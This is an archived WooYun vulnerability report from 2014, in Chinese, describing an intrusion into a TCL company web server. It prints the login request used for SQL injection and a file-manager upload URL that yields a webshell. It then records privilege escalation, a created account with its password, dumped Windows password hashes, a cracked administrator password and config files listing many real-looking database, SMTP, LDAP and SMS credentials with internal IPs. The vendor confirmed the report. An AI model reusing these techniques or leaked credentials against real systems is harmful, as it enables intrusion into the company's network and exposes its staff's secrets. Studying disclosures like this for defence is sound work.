{"id": 1499, "wybug_id": "wooyun-2014-069814", "wybug_title": "结合前人对TCL内网的一次安全检测", "wybug_corp": "TCL官方网上商城", "wybug_author": "炊烟", "wybug_date": "2014-07-26 20:45", "wybug_open_date": "2014-09-09 20:46", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "用户敏感信息泄露", "隐私安全", "攻击案例"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向公众公开  简要描述： 之前提交的N多漏洞，你们都没修复.. 详细说明：  \nhttp://magazine.tcl.com/manager/login.aspx\n 由于之前某牛提交的post注入没修复导致进入后台\n\npost包:\nPOST /manager/login.aspx HTTP/1.1Host: magazine.tcl.comProxy-Connection: keep-aliveContent-Length: 209Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://magazine.tcl.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://magazine.tcl.com/manager/login.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=d1o10s55xvo5uj55h3jgduam__VIEWSTATE=%2FwEPDwUKMTQ2NTI5ODg0N2RkueS%2Ff%2Ba8T7EhKt660xbvO1hRf1k%3D&__EVENTVALIDATION=%2FwEWBAKZ8PLhCAKz8dzmCQLyveCRDwKti4TYC7mlf8tzPuNjnDolSoWfnjAXxdRb&txtuserid=admin&password=admin123&bnok=%C8%B7%B6%A8\n\n\n使用此管理员帐号成功进入后台:gubz wdg4345654 \n\nhttp://magazine.tcl.com/manager/ftb/help/ftb.imagegallery.aspx?rif=../upload&cif=../upload 得到shell\n\n\nshell地址：http://magazine.tcl.com/upload/1.asa;1.jpg\n经过多次的exp测试和翻文件，成功使用pr提权(测试过程貌似使网站死了几分钟 >p<)\n\n\n\n\n提权帐号:smoke$ smoke520\n   漏洞证明：  登录服务器\n\n\n\n\n\n\nhash:Administrator:500:C42AB4FDD2E5209873946B1E7B905DD7:75B6FE7933203A61E9411B65BB699540:::Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::SUPPORT_388945a0:1001:NO PASSWORD*********************:E01C66FBAD728559C0B7D2E8A2748DDC:::IUSR_TCL-HQWEBAPP:1003:75ED74016B24CE3B0D672C5B9753E5FD:915F3C84BF7DEAC005BA89C7BE26F4BC:::IWAM_TCL-HQWEBAPP:1004:558D4251AB2847BE2903B96741F01C95:CEEEE45E12B17A7CAEE2C607BC04907F:::ASPNET:1007:82C09D009D6309CF14C1D8C7226E090D:20AC2CF35AFB2AA03935E74252D53CA4:::\n破解得出密码:administrator tcl_web@tcl以下是一些配置文件的信息，尽管有些不能利用了，但还是有漏.\n<add key=\"DBserver\" value=\"10.1.60.73\"/>    <add key=\"Dbase\" value=\"TclContacts\"/>    <add key=\"DbUserId\" value=\"txl_sa\"/>    <add key=\"DbUserPSW\" value=\"twk3q7hc1f3\"/>    <!--    <add key=\"DBserver\" value=\"127.0.0.1\"/>    <add key=\"Dbase\" value=\"Tcl_Tx\"/>    <add key=\"DbUserId\" value=\"sa\"/>    <add key=\"DbUserPSW\" value=\"9898918\"/>-->        <add key=\"AdminList\" value=\"mql,tangyt,mql_test\"/>    <!--       <add key=\"DBserver\" value=\"218.106.129.16\"/>    <add key=\"Dbase\" value=\"Tcl_Tx\"/>    <add key=\"DbUserId\" value=\"dirxml\"/>    <add key=\"DbUserPSW\" value=\"dirxml\"/>     -->    <add key=\"SMTPServer\" value=\"mail.tcl.com\"/>     <!-- <add key=\"SMTPServer\" value=\"mail.chinasky.net\"/>    <add key=\"SMTPServer\" value=\"smtp.163.com\"/> -->    <add key=\"SMTPUsername\" value=\"test2@tcl.com\"/>    <add key=\"SMTPPassword\" value=\"123456\"/>    <add key=\"AttacheDefaultSize\" value=\"1000\"/>    <add key=\"AttacheMaxSize\" value=\"5000\"/>    <add key=\"NDSHost\" value=\"idm.tcl.com\"/>    <!--10.3.3.55-->    <!--218.106.129.15-->    <add key=\"NDSPort\" value=\"389\"/>    <add key=\"NDSUser\" value=\"cn=tangyt,ou=浼佷笟绠＄悊閮?ou=TCL闆嗗洟鎬婚儴,ou=鍛樺伐,o=TCL\"/>    <add key=\"NDSSearchScope\" value=\"ou=鍛樺伐,o=TCL\"/>    <add key=\"NDSSearchScope1\" value=\"o=TCL\"/>    <add key=\"NDSPassword\" value=\"\"/>    <add key=\"cipherKey\" value=\"PortalTcL1008711\"/>    <add key=\"NDUpdate\" value=\"cn=addressuser,ou=appBindUsers,o=TCL\"/>    <add key=\"searchBase\" value=\"ou=鍛樺伐,o=TCL\"/>    <add key=\"NDPwd\" value=\"9898918\"/>    <add key=\"PwdUrl\" value=\"\"/>    <add key=\"ContactUrl\" value=\"\"/>    <add key=\"UserPwd\" value=\"111111\"/>  </appSettings><?xml version=\"1.0\" encoding=\"utf-8\" ?><configuration>  <appSettings>    <add key=\"DBserver\" value=\"10.0.0.33\" />    <add key=\"Dbase\" value=\"Tcl_Tx\" />    <add key=\"DbUserId\" value=\"sa\" />    <add key=\"DbUserPSW\" value=\"t8#30ykp\" />    <add key=\"NDSHost\" value=\"10.3.3.52\" />    <add key=\"NDSPort\" value=\"389\" />    <add key=\"NDSUser\" value=\"cn=tangyt,ou=浼佷笟绠＄悊閮?ou=TCL闆嗗洟鎬婚儴,ou=鍛樺伐,o=TCL\" />    <add key=\"NDSSearchScope\" value=\"ou=鍛樺伐,o=TCL\" />    <add key=\"NDSSearchScope1\" value=\"o=TCL\" />    <add key=\"NDSPassword\" value=\"thc1212\" />    <add key=\"cipherKey\" value=\"PortalTcL1008711\" />    <add key=\"NDUpdate\" value=\"cn=addressuser,ou=appBindUsers,o=TCL\" />    <add key=\"searchBase\" value=\"ou=鍛樺伐,o=TCL\" />    <add key=\"NDPwd\" value=\"9898918\" />    <add key=\"PwdUrl\" value=\"\" />    <add key=\"ContactUrl\" value=\"\" />    <add key=\"UserPwd\" value=\"111111\" />    <add key=\"LastUpdate\" value=\"2008-8-19\" />    <add key=\"StartHour\" value=\"9\" />    <add key=\"SyComm\" value=\"False\" />    <add key=\"SyIdm\" value=\"False\" />  </appSettings></configuration>\t<appSettings>    <add key=\"ConnString\" value=\"server=10.1.60.73;uid=survey_sa;pwd=qazxdrtcl20090423;persist security info=False;initial catalog=survey;Max Pool Size=1000\"/>    <add key=\"smtpuserid\" value=\"eip\"/>    <add key=\"smtppassword\" value=\"tcl20060430\"/>    <add key=\"revertadds\" value=\"eip@tcl.com\"/>    <add key=\"smtpserver\" value=\"mail.tcl.com\"/>  \t <add key=\"smtpserver\" value=\"mail.tcl.com\" />  \t <add key=\"smtpuserid\" value=\"tangyt\" />  \t <add key=\"smtppassword\" value=\"tangyitian\"/>  \t <add key=\"smsuserid\" value=\"tclgroup\" />  \t <add key=\"smspassword\" value=\"701860\" />  <add key=\"accredit_cw\" value=\"server=10.0.0.63;uid=test;pwd=ufys135;database=ufdata_023_2008\"/><add key=\"accredit\" value=\"server=10.0.0.33;uid=cwmanagerid;pwd=yx37$m28;database=cw\"/>\n   修复方案：  PS:对于提交的漏洞能够重视起来,不然我们拿rank也只能说一个愿打一个愿挨.在测试过程中,没做任何破坏,请勿110.最后一句,我相信我们国产能够做的更好!加油!   版权声明：转载请注明来源 炊烟@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-26 20:56 厂商回复： 汗颜！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-26 20:49 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  对啊！    \n     2014-07-26 22:53 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  MARK    \n     2014-07-28 09:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  来看看前人是谁    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}